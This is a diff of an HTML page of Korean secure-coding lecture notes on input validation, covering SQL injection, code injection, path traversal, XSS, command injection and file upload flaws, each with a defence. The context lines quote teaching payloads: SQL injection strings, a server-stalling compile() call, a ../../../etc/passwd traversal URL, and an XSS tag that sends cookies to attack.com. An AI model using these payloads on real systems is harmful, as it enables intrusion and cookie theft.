@@ -6,11 +6,10 @@
   <title>시큐어코딩 1-4 - 입력 데이터 검증 1부</title>
   <link rel="stylesheet" href="../../../../assets/styles.css?v=20260613-hero-kicker">
   <script src="../../../../assets/code-highlight.js" defer></script>
-  <script src="../../../../assets/study-state.js" defer></script>
   <script src="../../../../assets/study-tools.js" defer></script>
 </head>
 
-<body data-course-id="secure-coding" data-lesson-id="1-4" data-lesson-key="secure-coding:1-4" data-lesson-title="입력 데이터 검증 1부" data-lesson-label="시큐어코딩 1-4">
+<body data-course-id="secure-coding" data-lesson-id="1-4" data-lesson-title="입력 데이터 검증 1부" data-lesson-label="시큐어코딩 1-4">
   <header class="site-header lecture-header">
     <nav class="top-nav">
 	      <a class="brand" href="../../../../index.html">화이트햇 강의 정리</a>
@@ -33,18 +32,6 @@
   </header>
 
   <main class="lecture-main">
-    <section class="content-wrap lesson-status-panel" aria-label="현재 강의 완료 상태">
-      <div>
-        <span class="study-card-kicker">현재 강의</span>
-        <strong>시큐어코딩 1-4 완료 상태</strong>
-        <p>정리와 복습 질문까지 확인했다면 완료로 표시해 둔다.</p>
-      </div>
-      <button class="completion-toggle large" type="button" data-lesson-key="secure-coding:1-4" aria-pressed="false">
-        <span class="completion-dot" aria-hidden="true"></span>
-        <span class="completion-label">완료 표시</span>
-      </button>
-    </section>
-
     
     <section class="content-wrap lecture-control-panel" aria-label="강의 탐색 도구">
       <div class="section-jump-field">
@@ -127,8 +114,8 @@
             <p>4강부터는 <strong>OWASP Top 10</strong>을 넘어 실제 <strong>시큐어 코딩</strong> 기법으로 들어간다. 이번 강의의 주제는 <strong>입력 데이터 검증 및 표현</strong>이다. 강사는 대부분의 해킹 공격이 악의적인 입력을 주는 방식으로 이루어지므로, 개발자가 어떤 입력을 허용하고 어떤 입력을 거부할지 잘 정하는 것만으로도 많은 공격을 줄일 수 있다고 설명한다.</p>
 
 <figure class="screen-figure">
-  <a href="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0003.jpg" target="_blank" rel="noopener">
-    <img src="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0003.jpg" alt="입력 데이터 검증 및 표현 범위" loading="lazy">
+  <a href="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0003.jpg" target="_blank" rel="noopener">
+    <img src="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0003.jpg" alt="입력 데이터 검증 및 표현 범위" loading="lazy">
   </a>
   <figcaption>
     <strong>입력 데이터 검증 및 표현 범위</strong>
@@ -150,8 +137,8 @@
             <p><strong>SQL Injection</strong>은 웹 서버가 데이터베이스와 상호작용하는 지점에서 발생한다. <strong>로그</strong>인, 게시글 작성, 댓글 작성, 게시글 수정 같은 기능은 대부분 DB 쿼리를 실행한다. 공격자가 조작된 요청을 보내고, 서버가 그 입력을 쿼리 문자열의 일부로 사용하면 개발자가 의도한 것과 다른 DB 동작이 일어난다.</p>
 
     <figure class="screen-figure">
-      <a href="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0011.jpg" target="_blank" rel="noopener">
-        <img src="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0011.jpg" alt="SQL Injection 공격 흐름" loading="lazy">
+      <a href="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0011.jpg" target="_blank" rel="noopener">
+        <img src="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0011.jpg" alt="SQL Injection 공격 흐름" loading="lazy">
       </a>
       <figcaption>
         <strong>SQL Injection 공격 흐름</strong>
@@ -162,8 +149,8 @@
                     <p>슬라이드의 공격 패턴은 <code>'or' 1=1</code>, <code>'having 1=1 --</code>, <code>Admin '--</code>, <code>union select</code>처럼 쿼리 문법을 바꾸는 <strong>문자열</strong>이다. 서버가 사용자 <strong>입력</strong>을 단순 데이터가 아니라 SQL 문법으로 해석하게 만들면 WHERE 조건이 무력화되거나, 원래 조회하지 말아야 할 데이터까지 가져올 수 있다.</p>
 
     <figure class="screen-figure">
-      <a href="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0021.jpg" target="_blank" rel="noopener">
-        <img src="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0021.jpg" alt="SQL Injection 취약 코드" loading="lazy">
+      <a href="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0021.jpg" target="_blank" rel="noopener">
+        <img src="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0021.jpg" alt="SQL Injection 취약 코드" loading="lazy">
       </a>
       <figcaption>
         <strong>SQL Injection 취약 코드</strong>
@@ -195,8 +182,8 @@ def update_board(request):
                     <p>여기서 <code>name</code>은 게시판 이름처럼 보이지만 실제로는 사용자가 보낸 임의 문자열이다. 공격자가 <code>name</code> 안에 따옴표, OR 조건, 주석 기호를 섞으면 전체 UPDATE 쿼리의 의미가 바뀔 수 있다. 입력값이 검증되지 않았고, 그 입력값이 SQL 문장 내부에 그대로 포함되는 것이 문제다.</p>
 
     <figure class="screen-figure">
-      <a href="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0023.jpg" target="_blank" rel="noopener">
-        <img src="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0023.jpg" alt="SQL Injection 방어 코드" loading="lazy">
+      <a href="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0023.jpg" target="_blank" rel="noopener">
+        <img src="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0023.jpg" alt="SQL Injection 방어 코드" loading="lazy">
       </a>
       <figcaption>
         <strong>SQL Injection 방어 코드</strong>
@@ -238,8 +225,8 @@ def update_board(request):
             <p><strong>Code Injection</strong>은 사용자의 <strong>입력</strong>이 서버에서 코드처럼 실행되는 문제다. Python의 <code>eval()</code>, <code>compile()</code>처럼 문자열을 코드로 해석하는 함수는 편리할 수 있지만, 외부 입력을 그대로 넣으면 공격자가 보낸 코드가 서버에서 실행될 수 있다.</p>
 
     <figure class="screen-figure">
-      <a href="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0027.jpg" target="_blank" rel="noopener">
-        <img src="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0027.jpg" alt="Code Injection 공격 흐름" loading="lazy">
+      <a href="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0027.jpg" target="_blank" rel="noopener">
+        <img src="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0027.jpg" alt="Code Injection 공격 흐름" loading="lazy">
       </a>
       <figcaption>
         <strong>Code Injection 공격 흐름</strong>
@@ -250,8 +237,8 @@ def update_board(request):
                     <p>강의 예시는 <code>compile('for x in range(1):\n import time\n time.sleep(20)', 'a', 'single')</code>처럼 서버가 <strong>실행</strong> 가능한 <strong>파이썬</strong> 코드 문자열을 입력으로 받는 상황이다. 이 정도만으로도 웹 서버가 20초 동안 멈출 수 있고, 더 악의적인 입력이라면 백도어 설치나 정보 탈취 코드 실행으로 이어질 수 있다.</p>
 
     <figure class="screen-figure">
-      <a href="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0031.jpg" target="_blank" rel="noopener">
-        <img src="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0031.jpg" alt="eval 사용 취약 코드" loading="lazy">
+      <a href="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0031.jpg" target="_blank" rel="noopener">
+        <img src="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0031.jpg" alt="eval 사용 취약 코드" loading="lazy">
       </a>
       <figcaption>
         <strong>eval 사용 취약 코드</strong>
@@ -274,8 +261,8 @@ def route(request):
                     <p><code>eval(message)</code>는 <code>message</code>를 단순 <strong>문자열</strong>이 아니라 파이썬 코드로 해석한다. 따라서 공격자가 보낸 입력이 산술식이든 <strong>함수</strong> 호출이든 서버 권한으로 실행될 수 있다. 사용자가 보낸 값을 코드 실행 함수에 전달하는 설계 자체가 매우 위험하다.</p>
 
     <figure class="screen-figure">
-      <a href="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0035.jpg" target="_blank" rel="noopener">
-        <img src="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0035.jpg" alt="Code Injection 입력 제한 예시" loading="lazy">
+      <a href="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0035.jpg" target="_blank" rel="noopener">
+        <img src="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0035.jpg" alt="Code Injection 입력 제한 예시" loading="lazy">
       </a>
       <figcaption>
         <strong>Code Injection 입력 제한 예시</strong>
@@ -309,8 +296,8 @@ def route(request):
             <p><strong>Path Traversal</strong>은 파일 다운로드나 파일 읽기 기능에서 사용자가 보낸 파일명·경로를 악용해 허용된 디렉터리 밖의 파일에 접근하는 <strong>취약점</strong>이다. 웹 게시판의 첨부파일 다운로드 URL이 <code>filename</code>과 <code>path</code>를 입력으로 받는다면, 공격자는 <code>../</code>를 이용해 상위 디렉터리로 이동하려고 시도할 수 있다.</p>
 
     <figure class="screen-figure">
-      <a href="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0039.jpg" target="_blank" rel="noopener">
-        <img src="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0039.jpg" alt="Path Traversal 공격 흐름" loading="lazy">
+      <a href="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0039.jpg" target="_blank" rel="noopener">
+        <img src="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0039.jpg" alt="Path Traversal 공격 흐름" loading="lazy">
       </a>
       <figcaption>
         <strong>Path Traversal 공격 흐름</strong>
@@ -321,8 +308,8 @@ def route(request):
                     <p>슬라이드 예시는 정상 URL이 <code>http://www.victim.com/file/download/?filename=pic.jap&amp;path=data</code>인데, 변조 후에는 <code>filename=passwd&amp;path=../../../etc/</code>처럼 시스템 파일이 있는 경로를 가리킨다. 서버가 이 값을 그대로 파일 접근에 사용하면 <code>/etc/passwd</code> 같은 민감 파일을 읽게 될 수 있다.</p>
 
     <figure class="screen-figure">
-      <a href="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0043.jpg" target="_blank" rel="noopener">
-        <img src="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0043.jpg" alt="Path Traversal 취약 코드" loading="lazy">
+      <a href="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0043.jpg" target="_blank" rel="noopener">
+        <img src="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0043.jpg" alt="Path Traversal 취약 코드" loading="lazy">
       </a>
       <figcaption>
         <strong>Path Traversal 취약 코드</strong>
@@ -351,8 +338,8 @@ def get_info(request):
                     <p><code>.txt</code>, <code>.csv</code> 확장자만 확인하는 것은 충분하지 않다. 파일명 자체가 상위 경로를 포함할 수 있고, 경로 구분자가 들어가면 서버가 의도한 디렉터리 밖의 파일을 열 수 있다. 즉 “어떤 확장자인가”와 “어느 경로의 파일인가”는 별도로 검증해야 한다.</p>
 
     <figure class="screen-figure">
-      <a href="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0047.jpg" target="_blank" rel="noopener">
-        <img src="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0047.jpg" alt="Path Traversal 방어 코드" loading="lazy">
+      <a href="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0047.jpg" target="_blank" rel="noopener">
+        <img src="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0047.jpg" alt="Path Traversal 방어 코드" loading="lazy">
       </a>
       <figcaption>
         <strong>Path Traversal 방어 코드</strong>
@@ -399,8 +386,8 @@ def get_info(request):
             <p><strong>XSS</strong>, Cross-Site Scripting은 공격자가 넣은 스크립트가 다른 사용자의 브라우저에서 <strong>실행</strong>되는 취약점이다. 게시글, 프로필 URL, 닉네임, 댓글처럼 사용자가 입력한 값이 HTML에 그대로 들어가면 공격자는 태그 구조를 깨고 스크립트나 이벤트 핸들러를 삽입할 수 있다.</p>
 
     <figure class="screen-figure">
-      <a href="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0051.jpg" target="_blank" rel="noopener">
-        <img src="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0051.jpg" alt="XSS 공격 흐름" loading="lazy">
+      <a href="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0051.jpg" target="_blank" rel="noopener">
+        <img src="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0051.jpg" alt="XSS 공격 흐름" loading="lazy">
       </a>
       <figcaption>
         <strong>XSS 공격 흐름</strong>
@@ -411,8 +398,8 @@ def get_info(request):
                     <p>슬라이드는 <code>&lt;img src="http://attack.com/dog.jpg?cookie="document.cookie&gt;</code> 형태의 공격 스크립트를 예로 든다. 공격자가 스크립트가 포함된 게시글을 등록하고, 다른 사용자가 그 게시글을 요청하면, 웹 서버는 공격 스크립트가 포함된 게시글 페이지를 응답한다. 사용자의 브라우저가 그 페이지를 렌더링하는 순간 공격자 스크립트가 실행될 수 있다.</p>
 
     <figure class="screen-figure">
-      <a href="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0055.jpg" target="_blank" rel="noopener">
-        <img src="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0055.jpg" alt="mark_safe 사용 XSS 취약 코드" loading="lazy">
+      <a href="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0055.jpg" target="_blank" rel="noopener">
+        <img src="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0055.jpg" alt="mark_safe 사용 XSS 취약 코드" loading="lazy">
       </a>
       <figcaption>
         <strong>mark_safe 사용 XSS 취약 코드</strong>
@@ -447,8 +434,8 @@ def profile_link(request):
             <p><strong>Command Injection</strong>은 사용자 <strong>입력</strong>이 운영체제 명령으로 실행되는 취약점이다. Python의 <code>os.system()</code>처럼 시스템 명령을 실행하는 API에 외부 입력을 그대로 넣으면, 공격자는 서버에서 임의 명령을 실행할 수 있다.</p>
 
     <figure class="screen-figure">
-      <a href="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0063.jpg" target="_blank" rel="noopener">
-        <img src="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0063.jpg" alt="Command Injection 취약 코드" loading="lazy">
+      <a href="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0063.jpg" target="_blank" rel="noopener">
+        <img src="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0063.jpg" alt="Command Injection 취약 코드" loading="lazy">
       </a>
       <figcaption>
         <strong>Command Injection 취약 코드</strong>
@@ -471,8 +458,8 @@ def execute_command(request):
                     <p>개발자는 메모장이나 계산기처럼 특정 프로그램 <strong>실행</strong>만 의도했을 수 있다. 그러나 입력값을 제한하지 않으면 공격자는 <code>ls</code>, <code>dir</code>, <code>set</code> 같은 정보 조회 명령부터 파일 삭제, 다운로드, <strong>권한</strong> 변경 명령까지 서버 권한으로 실행하려고 할 수 있다.</p>
 
     <figure class="screen-figure">
-      <a href="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0067.jpg" target="_blank" rel="noopener">
-        <img src="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0067.jpg" alt="Command Injection 화이트리스트 방어" loading="lazy">
+      <a href="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0067.jpg" target="_blank" rel="noopener">
+        <img src="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0067.jpg" alt="Command Injection 화이트리스트 방어" loading="lazy">
       </a>
       <figcaption>
         <strong>Command Injection 화이트리스트 방어</strong>
@@ -508,8 +495,8 @@ def execute_command(request):
             <p><strong>파일 업로드 취약점</strong>은 사용자가 올리는 파일의 종류, 크기, 개수, 이름, 확장자를 검증하지 않아 악성 파일이 서버에 저장될 때 발생한다. 게시판 첨부파일이나 이미지 업로드 기능은 흔하지만, 제한 없이 저장하면 웹셸이나 스크립트 파일이 올라가 서버 공격으로 이어질 수 있다.</p>
 
     <figure class="screen-figure">
-      <a href="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0071.jpg" target="_blank" rel="noopener">
-        <img src="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0071.jpg" alt="File Upload 취약 코드" loading="lazy">
+      <a href="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0071.jpg" target="_blank" rel="noopener">
+        <img src="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0071.jpg" alt="File Upload 취약 코드" loading="lazy">
       </a>
       <figcaption>
         <strong>File Upload 취약 코드</strong>
@@ -536,8 +523,8 @@ def file_upload(request):
                     <p>이 코드는 파일 개수, 파일 크기, 콘텐츠 타입, 확장자를 확인하지 않는다. 공격자는 <strong>실행</strong> 가능한 파일이나 매우 큰 파일, 의도하지 않은 형식의 파일을 업로드할 수 있다. 업로드 위치가 웹에서 실행 가능한 경로라면 위험은 더 커진다.</p>
 
     <figure class="screen-figure">
-      <a href="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0075.jpg" target="_blank" rel="noopener">
-        <img src="../../../../videos/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0075.jpg" alt="File Upload 제한 적용 코드" loading="lazy">
+      <a href="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0075.jpg" target="_blank" rel="noopener">
+        <img src="../../../../screenshots/common-development/secure-coding/시큐어코딩-04-입력-데이터-검증-1부/시큐어코딩-04-입력-데이터-검증-1부 - 0075.jpg" alt="File Upload 제한 적용 코드" loading="lazy">
       </a>
       <figcaption>
         <strong>File Upload 제한 적용 코드</strong>
